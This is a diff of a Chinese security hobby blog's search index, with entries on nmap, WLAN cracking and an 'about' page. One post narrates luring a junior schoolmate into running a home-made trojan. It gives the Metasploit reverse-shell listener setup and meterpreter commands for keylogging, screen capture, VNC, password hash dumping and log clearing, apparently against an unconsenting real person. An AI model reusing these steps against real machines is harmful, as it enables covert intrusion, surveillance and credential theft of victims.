@@ -1,9 +1,16 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>1</title>
+    <url>/post/83dcefb7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>这是一次测试</p>
+<h1 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h1><p>测试</p>
+<h2 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h2>]]></content>
+  </entry>
+  <entry>
     <title>爱安全-价值1800的无线WLAN攻防教程</title>
-    <url>/post/d0056290.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>无线WLAN攻防课程<br><a href="https://s1.ax1x.com/2020/08/15/dkdz8S.gif"><img src="https://s1.ax1x.com/2020/08/15/dkdz8S.gif" alt="img"></a><br>加Q群702861483联系群主领取资料<br>【网络安全技术讨论群】：<a href="https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC">https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC</a></p>
+    <url>/post/d0056290/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>无线WLAN攻防课程<br><a href="https://s1.ax1x.com/2020/08/15/dkdz8S.gif"><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/15/dkdz8S.gif" alt="img"></a><br>加Q群702861483联系群主领取资料<br>【网络安全技术讨论群】：<a href="https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC">https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC</a></p>
 ]]></content>
       <categories>
         <category>资料分享</category>
@@ -14,7 +21,7 @@
   </entry>
   <entry>
     <title>信息收集之nmap</title>
-    <url>/post/96512c85.html</url>
+    <url>/post/96512c85/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x01-nmap介绍"><a href="#0x01-nmap介绍" class="headerlink" title="0x01 nmap介绍"></a>0x01 nmap介绍</h1><p>Nmap是一个开源，免费的网络探测工具，可以用来探测存活主机以及开放的端口等，支持windows，linux，mac等多种操作系统。</p>
 <p><a href="https://nmap.org/download.html">nmap下载官网</a></p>
 <h1 id="0x02nmap常用功能"><a href="#0x02nmap常用功能" class="headerlink" title="0x02nmap常用功能"></a>0x02nmap常用功能</h1><ul>
@@ -39,8 +46,21 @@
       </tags>
   </entry>
   <entry>
+    <title>关于本博客</title>
+    <url>/post/4a17b156/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>本博客搭建时间为2020.01.01</h1>
+
+<p>By xiaochen</p>
+<div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">关于作者</button></li><li class="tab"><button type="button" data-href="#test3-2">关于博客</button></li><li class="tab"><button type="button" data-href="#test3-3">联系作者</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>一个正在上岸的网安萌新</strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>本站用于记录本人成长日记，以及分享一些杂七杂八的知识和学习资源.</strong></p>
+<p><strong>分享网络安全相关的文章以及学习资料</strong></p>
+<p><strong>本站内容同步至<a href="https://hixiaochen.gitee.io/" title="My Gitee">Gitee</a></strong></p>
+<p>其他博客文章<a href="https://blog.csdn.net/oo798" title="My CSDN">CSDN</a> ||<a href="https://www.cnblogs.com/hixiaochen/" title="My Blog garden">博客园</a></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>QQ:488675848.</strong><br><strong>email:<a href="mailto:&#x34;&#x38;&#56;&#54;&#55;&#53;&#x38;&#52;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x34;&#x38;&#56;&#54;&#55;&#53;&#x38;&#52;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<hr>]]></content>
+  </entry>
+  <entry>
     <title>无线攻击之aircrack-ng破解无线密码</title>
-    <url>/post/19ad867.html</url>
+    <url>/post/19ad867/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h1><ul>
 <li>环境准备</li>
 <li></li>
@@ -55,23 +75,10 @@
       </tags>
   </entry>
   <entry>
-    <title>关于本博客</title>
-    <url>/post/4a17b156.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>本博客搭建时间为2020.01.01</h1>
-
-<p>By xiaochen</p>
-<div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">关于作者</button></li><li class="tab"><button type="button" data-href="#test3-2">关于博客</button></li><li class="tab"><button type="button" data-href="#test3-3">联系作者</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>一个正在上岸的网安萌新</strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>本站用于记录本人成长日记，以及分享一些杂七杂八的知识和学习资源.</strong></p>
-<p><strong>分享网络安全相关的文章以及学习资料</strong></p>
-<p><strong>本站内容同步至<a href="https://hixiaochen.gitee.io/" title="My Gitee">Gitee</a></strong></p>
-<p>其他博客文章<a href="https://blog.csdn.net/oo798" title="My CSDN">CSDN</a> ||<a href="https://www.cnblogs.com/hixiaochen/" title="My Blog garden">博客园</a></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>QQ:488675848.</strong><br><strong>email:<a href="mailto:&#x34;&#56;&#x38;&#x36;&#55;&#53;&#x38;&#x34;&#x38;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#x34;&#56;&#x38;&#x36;&#55;&#53;&#x38;&#x34;&#x38;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a></strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-<hr>]]></content>
-  </entry>
-  <entry>
     <title>记一次内网渗透电脑</title>
-    <url>/post/40a967b4.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>emmm…这个原因就不说了哈哈 懂得都懂</p>
-<p><img src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p>
+    <url>/post/40a967b4/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm…这个原因就不说了哈哈 懂得都懂</p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p>
 <h1 id="0x02-准备环境"><a href="#0x02-准备环境" class="headerlink" title="0x02 准备环境"></a>0x02 准备环境</h1><p>攻击机：kali</p>
 <p>靶机：学弟的Pc</p>
 <h2 id="开始制作木马"><a href="#开始制作木马" class="headerlink" title="开始制作木马"></a>开始制作木马</h2><p>裸奔木马</p>
@@ -106,15 +113,15 @@
 <td align="center">指定处理完毕后的文件输出路径</td>
 </tr>
 </tbody></table>
-<p><img src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p>
 <p>把木马放到html下</p>
-<p><img src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p>
 <h2 id="运行msf监听模块"><a href="#运行msf监听模块" class="headerlink" title="运行msf监听模块"></a>运行msf监听模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 172.18.9.70</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x03-开始攻击"><a href="#0x03-开始攻击" class="headerlink" title="0x03 开始攻击"></a>0x03 开始攻击</h1><p>首先先诱导学弟点开链接并下载执行木马</p>
-<p><img src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p>
 <p>当学弟执行木马文件后 获得shell</p>
-<p><img src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p>
 <h1 id="0x04-获得shell之后的操作"><a href="#0x04-获得shell之后的操作" class="headerlink" title="0x04 获得shell之后的操作"></a>0x04 获得shell之后的操作</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter下的命令：</span><br><span class="line">getwd 当前目录</span><br><span class="line">dir 查看所有文件</span><br><span class="line">cat c:\123.txt 查看文件123.txt内容（数据是字符串传递，所以加一个转义字符\）</span><br><span class="line">search -f cmd.exe （搜索名为cmd.exe文件所在目录）</span><br><span class="line">upload /root/桌面/backldoor.exe（要上传的文件） -&gt; c:\（上传到的目录） 上传文件</span><br><span class="line">download c:\123txt /root 下载文件</span><br><span class="line">clearev 清除日志</span><br><span class="line">getuid 当前用户</span><br><span class="line">ps 查看所用进程</span><br><span class="line">kill 杀死某个进程</span><br><span class="line">sysinfo 系统信息</span><br><span class="line"></span><br><span class="line">键盘记录</span><br><span class="line">keyscan_start 开始键盘记录</span><br><span class="line">keyscan_dump 查看结果</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line">获取浏览器记录</span><br><span class="line">run post/windows/gather/forensics/browser_history</span><br><span class="line">打开拷贝到本地的文件</span><br><span class="line">/root/.msf4/local/aiyou_Firefox_wqsz7fg5.default-release_places.sqlite</span><br><span class="line">查看记录SELECT url FROM moz_places</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">屏幕截图</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line">屏幕监控</span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line">获取密文密码</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">获取shell，进入cmd</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>学弟：跟人沾边的事你一点都不干</p>
@@ -125,5 +132,11 @@
       <tags>
         <tag>渗透测试</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>记一次渗透外网</title>
+    <url>/post/f65a2643/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h2><p>- </p>
+]]></content>
   </entry>
 </search>
